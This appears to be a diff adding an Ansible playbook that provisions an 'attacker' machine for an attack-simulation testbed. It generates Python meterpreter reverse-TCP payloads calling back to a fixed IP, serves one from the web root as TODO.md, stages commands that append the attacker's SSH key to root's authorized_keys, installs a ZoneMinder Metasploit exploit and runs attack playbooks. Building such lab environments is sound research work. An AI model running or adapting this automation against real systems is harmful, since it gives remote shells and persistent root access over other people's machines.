@@ -1,0 +1,221 @@
+- name: Install Attacker Host
+  hosts: attacker
+  become: true
+  vars:
+    attacker_user: aecid
+  tasks:
+    - name: get user home directory
+      ansible.builtin.shell: >
+             getent passwd {{ attacker_user }}  | awk -F: '{ print $6 }'
+      changed_when: false
+      register: user_home
+      tags:
+        - metasploit
+        - zoneminder
+        - exploit
+        - config
+        - install
+        - git
+        - penpal
+        - playbooks
+
+    - name: Create shellcode for port 3333
+      ansible.builtin.shell: >
+             msfvenom -p cmd/unix/python/meterpreter/reverse_tcp LHOST=192.42.1.174 LPORT=3333 --platform x64
+      changed_when: false
+      register: shellcode3333
+      tags:
+        - metasploit
+        - zoneminder
+        - exploit
+        - config
+        - install
+        - git
+        - penpal
+        - playbooks
+
+    - name: create private ssh key for attacker
+      community.crypto.openssh_keypair:
+          path: "{{user_home.stdout}}/.ssh/attacker_key"
+          owner: "{{ attacker_user }}"
+          group: "{{ attacker_user }}"
+      register: sshkey
+      tags:
+          - playbooks
+
+    - name: Create file with add-key-to-root-authorize-command
+      ansible.builtin.copy:
+              content: |
+                "\"echo {{sshkey.public_key}} >> /root/.ssh/authorized_keys\""
+              dest: "/var/www/html/README.txt"
+              owner: "root"
+              mode: "0755"
+      tags:
+          - playbook1
+          - playbook2
+          - playbooks
+
+    - name: Create file with add-key-to-root-authorize-command for pipe
+      ansible.builtin.copy:
+              content: |
+                "echo \"{{sshkey.public_key}}\" >> /root/.ssh/authorized_keys"
+              dest: "/var/www/html/README.txt.1"
+              owner: "root"
+              mode: "0755"
+      tags:
+          - playbook4
+          - playbook5
+
+    - name: Create file with add-key-to-root-authorize-command
+      ansible.builtin.shell:
+              cmd: msfvenom -p cmd/unix/python/meterpreter/reverse_tcp LHOST=192.42.1.174 --platform x64 > /var/www/html/TODO.md
+              creates: /var/www/html/TODO.md
+      tags:
+          - playbooks
+          - playbook4
+          - playbook5
+
+
+    - name: Prepare and Install Metasploit-Exploit
+      block:
+        - name: Prepare local Metasploit-Path
+          ansible.builtin.file:
+              path: "{{user_home.stdout}}/.msf4/modules/exploits/unix/webapp"
+              state: directory
+              recurse: yes
+              owner: "{{attacker_user}}"
+              group: "{{attacker_user}}"
+        
+        - name: Upload Zoneminder-Exploit
+          ansible.builtin.copy:
+              src: zoneminder_snapshots.rb
+              dest: "{{user_home.stdout}}/.msf4/modules/exploits/unix/webapp/zoneminder_snapshots.rb"
+              owner: "{{attacker_user}}"
+              group: "{{attacker_user}}"
+              mode: '0644'
+      tags:
+         - metasploit
+         - zoneminder
+         - exploit
+         - config
+         - install
+
+    - debug:
+         msg: "{{sshkey}}"
+    - name: Prepare and Install PenPal
+      block:
+        - name: Install Python3-venv
+          ansible.builtin.apt:
+              name: python3-virtualenv
+           #    - name: Git checkout
+           #      become: true
+           #      become_user: {{ attacker_user }}
+           #      ansible.builtin.git:
+           #        repo: 'git@github.com:ait-aecid/hackhelfer.git'
+           #        dest: "{{user_home.stdout}}/penpal"
+           #        accept_hostkey: True
+        - name: Install PenPal-Module
+          ansible.builtin.pip:
+              name: "file://{{user_home.stdout}}/penpal"
+              virtualenv: "{{user_home.stdout}}/penpal/venv"
+        - name: Copy PenPal-Wrapper
+          become: True
+          become_user: "{{attacker_user}}"
+          ansible.builtin.template:
+              src: wrapper.sh.j2
+              dest: "{{user_home.stdout}}/penpal/wrapper.sh"
+              mode: '0755'
+        - name: Copy playbooks
+          become: True
+          become_user: "{{attacker_user}}"
+          ansible.builtin.template:
+              src: "{{ item }}.j2"
+              dest: "{{user_home.stdout}}/penpal/{{ item }}.yml"
+              mode: '0755'
+          loop:
+              - playbook1
+              - playbook2
+              - playbook3
+              - playbook4
+              - playbook5
+              - scenario_1_d_a
+      tags:
+         - metasploit
+         - penpal
+         - exploit
+         - config
+         - install
+         - playbooks
+
+    - name: Run Playbook1
+      become: True
+      become_user: "{{attacker_user}}"
+      ansible.builtin.shell:
+          cmd: "{{user_home.stdout}}/penpal/wrapper.sh --config=playbook1.yml"
+          chdir: "{{user_home.stdout}}/penpal"
+      tags:
+         - playbook1
+         - metasploit
+         - penpal
+         - exploit
+
+    - name: Run Playbook2
+      become: True
+      become_user: "{{attacker_user}}"
+      ansible.builtin.shell:
+          cmd: "{{user_home.stdout}}/penpal/wrapper.sh --config=playbook2.yml"
+          chdir: "{{user_home.stdout}}/penpal"
+      tags:
+         - playbook2
+         - metasploit
+         - penpal
+         - exploit
+
+    - name: Run Playbook3
+      become: True
+      become_user: "{{attacker_user}}"
+      ansible.builtin.shell:
+          cmd: "{{user_home.stdout}}/penpal/wrapper.sh --config=playbook3.yml"
+          chdir: "{{user_home.stdout}}/penpal"
+      tags:
+         - playbook3
+         - metasploit
+         - penpal
+         - exploit
+
+    - name: Run Playbook4
+      become: True
+      become_user: "{{attacker_user}}"
+      ansible.builtin.shell:
+          cmd: "{{user_home.stdout}}/penpal/wrapper.sh --config=playbook4.yml"
+          chdir: "{{user_home.stdout}}/penpal"
+      tags:
+         - playbook4
+         - metasploit
+         - penpal
+         - exploit
+
+    - name: Run Playbook5
+      become: True
+      become_user: "{{attacker_user}}"
+      ansible.builtin.shell:
+          cmd: "{{user_home.stdout}}/penpal/wrapper.sh --config=playbook5.yml"
+          chdir: "{{user_home.stdout}}/penpal"
+      tags:
+         - playbook5
+         - metasploit
+         - penpal
+         - exploit
+
+    - name: "Run Scenario 1 d a"
+      become: True
+      become_user: "{{attacker_user}}"
+      ansible.builtin.shell:
+          cmd: "{{user_home.stdout}}/penpal/wrapper.sh --config=scenario_1_d_a.yml"
+          chdir: "{{user_home.stdout}}/penpal"
+      tags:
+         - scenario_1_d_a
+         - metasploit
+         - penpal
+         - exploit
+
